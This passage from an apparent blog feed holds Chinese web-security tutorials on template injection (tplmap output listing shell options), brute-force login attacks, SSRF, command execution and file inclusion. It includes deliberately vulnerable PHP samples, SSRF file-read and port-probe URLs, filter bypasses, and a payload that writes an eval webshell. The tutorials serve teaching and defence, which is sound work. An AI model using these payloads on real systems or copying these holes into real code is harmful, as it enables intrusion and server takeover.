http://127.0.0.1:8000?name=1</span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if GET parameter 'name' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '$&#123;*&#125;'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell                          Run shell on the target</span><br><span class="line">    --os-cmd                            Execute shell commands</span><br><span class="line">    --bind-shell PORT                   Connect to a shell bind to a target port</span><br><span class="line">    --reverse-shell HOST PORT   Send a shell back to the attacker's port</span><br><span class="line">    --upload LOCAL REMOTE       Upload files to the server</span><br><span class="line">    --download REMOTE LOCAL     Download remote files</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<ol>
<li><a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ</a></li>
<li><a href="https://mp.weixin.qq.com/s/ImO4z6XrY1RFVI1xTivHJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ImO4z6XrY1RFVI1xTivHJw</a></li>
<li><a href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/13508538.html</a></li>
<li><a href="https://blog.csdn.net/qq_45521281/article/details/106243544" target="_blank" rel="noopener">https://blog.csdn.net/qq_45521281/article/details/106243544</a></li>
</ol>
</blockquote>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-暴力破解]]></title>
      <url>/2021/02/05/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>暴力破解的产生是由于服务器端没有做限制，导致攻击者可以通过暴力的手 段破解所需信息，如用户名、密码、验证码等。暴力破解需要一个庞大的字典。 暴力破解的关键在于字典</p>
<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><blockquote>
<p>首先进行抓包</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814622594.png" alt="1599814622594" title class>
                <p>1599814622594</p>
            </figure>

<blockquote>
<p>将抓到的包发到 Intruder 模块</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814643215.png" alt="1599814643215" title class>
                <p>1599814643215</p>
            </figure>

<blockquote>
<p>先清除标记，然后自己标记账号和密码</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814784181.png" alt="1599814670366" title class>
                <p>1599814670366</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814670366.png" alt="1599815003089" title class>
                <p>1599815003089</p>
            </figure>

<blockquote>
<p>设置对应的字典</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599815003089.png" alt="1599814784181" title class>
                <p>1599814784181</p>
            </figure>

<blockquote>
<p>开始破解，长度和其他不同就是正确的</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814916130.png" alt="1599814916130" title class>
                <p>1599814916130</p>
            </figure>

<h2 id="暴力破解四种模式区别"><a href="#暴力破解四种模式区别" class="headerlink" title="暴力破解四种模式区别"></a>暴力破解四种模式区别</h2><h3 id="Sniper（狙击手模式）"><a href="#Sniper（狙击手模式）" class="headerlink" title="Sniper（狙击手模式）"></a>Sniper（狙击手模式）</h3><p><code>变量数量：不限</code></p>
<ul>
<li>添加了一个参数，且假设payload有n个，那么就会执行n次。</li>
<li>添加了两个参数，就会挨着来，第一个参数开始爆破时，第二个不变，如此这样，会进行n+n此 总共2n次爆破。</li>
</ul>
<h3 id="Battering-Ram（攻城锤模式）"><a href="#Battering-Ram（攻城锤模式）" class="headerlink" title="Battering Ram（攻城锤模式）"></a>Battering Ram（攻城锤模式）</h3><p><code>变量数量：不限</code></p>
<ul>
<li>一个参数情况下，与Sniper一样。</li>
<li>两个参数时，和sniper模式不同的地方在于，同样情况下，攻击次数减半，每次两个位置用同样的密码。</li>
</ul>
<h3 id="Pitchfork（草叉模式）"><a href="#Pitchfork（草叉模式）" class="headerlink" title="Pitchfork（草叉模式）"></a>Pitchfork（草叉模式）</h3><p><code>变量数量：需要和字段数量相同</code></p>
<ul>
<li><p>两个参数的话 ，要求添加两个payload</p>
<ul>
<li><p>dict1：1，2</p>
</li>
<li><p>dict2：3，4</p>
</li>
</ul>
</li>
<li><p>那么第一爆破为 1，3，而二次爆破为2，4</p>
</li>
<li><p>如果两个payload行数不一致的话，取最小值进行测试。</p>
</li>
</ul>
<h3 id="Cluster-Bomb（集束炸弹模式）"><a href="#Cluster-Bomb（集束炸弹模式）" class="headerlink" title="Cluster Bomb（集束炸弹模式）"></a>Cluster Bomb（集束炸弹模式）</h3><p><code>变量数量：需要和字段数量相同</code></p>
<ul>
<li>两个参数的话，dict1的第一个payload和dict2的每个payload进行组合爆破,会进行dict1中payload*dict2payload数量次数</li>
</ul>
<hr>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-SSRF]]></title>
      <url>/2021/02/05/SSRF/</url>
      <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。SSRF的出现使得waf变得不再那么无敌。攻击者通过伪造服务器请求与内网进行交互，从而达到探测内网，对内网进行攻击的目的。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<h2 id="漏洞出现点"><a href="#漏洞出现点" class="headerlink" title="漏洞出现点"></a>漏洞出现点</h2><ul>
<li>社交分享功能：通过URL地址分享网页内容</li>
<li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li>
<li>翻译：翻译给定得某个网址</li>
<li>图片加载/下载：通过URL加载和下载图片</li>
<li>图片/文章收藏功能</li>
<li>未公开的api实现以及其他扩展调用URL的功能</li>
<li>通过关键字寻找<code>share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</code></li>
</ul>
<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>在PHP中常见的造成ssrf的函数有<code>file_get_contents()</code>，<code>fsockopen()</code>和<code>curl</code>。</p>
<h3 id="漏洞造成"><a href="#漏洞造成" class="headerlink" title="漏洞造成"></a>漏洞造成</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Getfile</span><span class="params">($host, $port, $link)</span></span>&#123;</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$fp)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>;</span><br><span class="line">        $out .= <span class="string">"HOST $host \r\n"</span>;</span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>;</span><br><span class="line">        $out .= <span class="string">"\r\n"</span>;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $content = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(!feof($fp))&#123;</span><br><span class="line">            $contents .= fgets($fp, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="读取IP"><a href="#读取IP" class="headerlink" title="读取IP"></a>读取IP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ip.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"Your ip is "</span>.$ip;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接访问<code>ip.php</code>发现是我们自己的P地址</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598259501707.png" alt="1598259501707" title class>
                <p>1598259501707</p>
            </figure>

<p>利用SSRF漏洞访问<code>ip.php</code>发现是服务器的地址</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598259579496.png" alt="1598259579496" title class>
                <p>1598259579496</p>
            </figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li><p>file：读取服务器上任意文件内容</p>
<ul>
<li><code>http://192.168.65.128/ssrf/1.php?url=file://c:/2.txt</code></li>
</ul>
</li>
<li><p>dict：可以探测端口</p>
<ul>
<li><code>http://192.168.65.128/ssrf/1.php?url=dict://127.0.0.1:3306</code></li>
</ul>
</li>
<li><p>http:：访问内网限制的网址</p>
<ul>
<li><code>http://192.168.65.128/ssrf/1.php?url=http://127.0.0.1</code></li>
</ul>
</li>
<li><p>gopher：反弹shell</p>
</li>
</ul>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul>
<li>@<ul>
<li><code>http://baidu.com@www.baidu.com/</code>与<code>http://www.baidu.com/</code>请求时是相同的</li>
</ul>
</li>
<li>添加端口号<ul>
<li><code>http://127.0.0.1:8080</code></li>
</ul>
</li>
<li>短网址绕过<ul>
<li><code>http://t.cn/RwbLKDx</code></li>
</ul>
</li>
<li>ip地址转换成进制来访问 <ul>
<li><code>192.168.0.1</code>=<code>3232235521</code>（十进制）</li>
</ul>
</li>
<li>xip.io来绕过<ul>
<li><code>http://www.qq.com.192.168.0.1.xip.io/</code>=<code>192.168.0.1</code></li>
</ul>
</li>
</ul>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
<li>限制协议为HTTP、HTTPS</li>
<li>限制302跳转次数</li>
<li>统一错误信息</li>
<li>限制内网IP</li>
</ul>
<hr>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-命令执行]]></title>
      <url>/2021/02/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>命令执行漏洞是指攻击者可以随意执行系统命令，分为代码执行和命令执行两类。</code></p>
<p>程序应用有时需要调用一些执行系统命令的函数，如PHP中<code>system</code>、<code>exec</code>、<code>shell_exec</code>、<code>passthru</code>、<code>popen</code>、<code>proc_popen</code>等，当用户能控制这些函数的参数时就能将恶意系统命令拼接到正常命令中，从而造成<strong>命令执行</strong>攻击。代码执行漏洞是指应用程序本身过滤不严，如PHP中<code>eval</code>、<code>assert</code>、<code>call_user_func</code>、<code>call_user_fuc_array</code>、<code>create_function</code>、<code>preg_replace</code>、<code>array_map</code>、<code>array_filter</code>、<code>usort</code>、<code>${}</code>等，攻击者可以通过请求将代码注入到应用中， 最终在 web 服务器上去执行,从而造成<strong>代码执行</strong>攻击。</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
<li>cd 切换目录 </li>
<li>dir 显示目录内容</li>
<li>tree 显示目录结构 </li>
<li>type 显示文本文件内容 </li>
<li>echo 输出 </li>
<li>ipconfig 查看 ip 信息 </li>
<li>systeminfo 查看当前计算机的综合信息 </li>
<li>net start 查看已经启动的服务 </li>
<li>whoami 查看当前用户</li>
</ul>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
<li>ls 查看目录中的文件 </li>
<li>pwd 显示工作路径 </li>
<li>hostname 查看主机名 </li>
<li>ifconfig 查看网络信息 </li>
<li>cat 查看文件内容 </li>
<li>touch 创建文件 </li>
<li>chmod 修改权限 </li>
<li>uname 显示系统信息</li>
</ul>
<h3 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h3><ul>
<li><code>&amp;</code> 顺序执行多条命令，而不管命令是否执行成功 </li>
<li><code>&amp;&amp;</code> 顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令 </li>
<li><code>||</code> 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令 </li>
<li><code>|</code> 对前面命令的结果执行后面的命令</li>
<li><code>;</code> 前面执行完执行后面的</li>
</ul>
<h2 id="函数作用"><a href="#函数作用" class="headerlink" title="函数作用"></a>函数作用</h2><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><ul>
<li>system：可以执行系统命令并将其输出</li>
<li>exec：执行命令，但无输出</li>
<li>passthru：执行命令并输出</li>
<li>shell_exec：执行命令，但无回显</li>
</ul>
<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><ul>
<li>eval：将字符串当做函数进行执行</li>
<li>assert：判断是否为字符串，是则当成代码执行</li>
<li>call_user_func：把第一个参数作为回调函数</li>
<li>call_user_fuc_array：回调函数，参数为数组</li>
<li>create_function：创建匿名函数</li>
<li>preg_replace：当为/e 时代码会执行，前提是不超过 php7</li>
<li>array_filter：依次将 array 数组中的每个值传递到回调函数</li>
<li>array_map：为数组的每个元素应用回调函数</li>
<li>usort：使用自定义函数对数组进行排序</li>
<li>${}：中间的 php 代码将会被解析</li>
</ul>
<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801111498.png" alt="1598801111498" title class>
                <p>1598801111498</p>
            </figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.php	动态函数调用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a()函数.."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"b()函数.."</span>;</span><br><span class="line">&#125;</span><br><span class="line">$fun=$_REQUEST[<span class="string">'fun'</span>];</span><br><span class="line"><span class="keyword">echo</span> $fun();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801174266.png" alt="1598801174266" title class>
                <p>1598801174266</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801425250.png" alt="1598801216337" title class>
                <p>1598801216337</p>
            </figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#3.php 动态函数调用（传递参数）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $fun = $_GET[<span class="string">'fun'</span>];</span><br><span class="line">    $par = $_GET[<span class="string">'par'</span>];</span><br><span class="line">    $fun($par);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801287452.png" alt="1598801287452" title class>
                <p>1598801287452</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801625275.png" alt="1598801425250" title class>
                <p>1598801425250</p>
            </figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $arr = $_GET[<span class="string">'arr'</span>];</span><br><span class="line">	$array = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">	$new_array = array_map($arr,$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598843280659.png" alt="1598801625275" title class>
                <p>1598801625275</p>
            </figure>

<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><blockquote>
<p>这里默认是输入一个IP地址就会返回ping的信息，我们利用连接符可以再后面添加我们的命令，并且没有任何过滤</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598844048445.png" alt="1598843280659" title class>
                <p>1598843280659</p>
            </figure>

<h3 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h3><blockquote>
<p>这里也没有进行严格过滤</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598844048445.png" alt="1598843280659" title class>
                <p>1598843280659</p>
            </figure>

<h3 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h3><blockquote>
<p>进行了过滤，所以这里需要绕过</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598843675551.png" alt="1598843675551" title class>
                <p>1598843675551</p>
            </figure>

<blockquote>
<p>这里对<code>|</code>的过滤是过滤<code>|</code>后面带一个空格，所以我们不输入空格直接执行即可</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801216337.png" alt="1598844048445" title class>
                <p>1598844048445</p>
            </figure>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
<li>尽量不要执行外部命令使用自定义函数或者函数库来代替外部命令的功能</li>
<li>关注安全信息动态，及时给框架打好补丁</li>
</ul>
<hr>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-文件包含]]></title>
      <url>/2021/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件包含（File Inclusion）即程序通过[包含函数]调用本地或远程文件，以此来实现拓展功能。当被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行。</p>
<h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><ul>
<li><code>include()</code><ul>
<li>包含失败会返回警告，文件继续向下执行</li>
</ul>
</li>
<li><code>include_once()</code><ul>
<li>与include()一样只不过会做once检测，如果文件被包含过，就不会再包含</li>
</ul>
</li>
<li><code>require()</code><ul>
<li>包含失败会返回错误，文件不会向下执行</li>
</ul>
</li>
<li><code>require_once()</code><ul>
<li>与require()一样只不过会做once检测，如果文件被包含过，就不会再包含</li>
</ul>
</li>
</ul>
<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"php.txt"</span>)    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php.txt 文件在本地</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span><span class="string">"hello php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>修改php.txt的扩展名为jpg、rar、aa等都可以解析，只要文件内容符合php语法规范，任何扩展名都可以被php解析</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597760772166.png" alt="1597760772166" title class>
                <p>1597760772166</p>
            </figure>

<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>需要<code>php.ini</code>服务开启<code>allow_url_fopen</code>和<code>allow_url_include</code>为ON</p>
<ul>
<li>allow_url_fopen = On (允许打开URL文件,预设启用)</li>
<li>allow_url_include = Off (允许引用URL文件,预设关闭)</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#hello.txt 文件不在本地</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span><span class="string">"hello world"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597760759559.png" alt="1597760759559" title class>
                <p>1597760759559</p>
            </figure>

<blockquote>
<p>通过远程文件包含包含<code>1.txt</code>，在服务器生成一句话木马<code>shell.php</code></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.txt</span></span><br><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

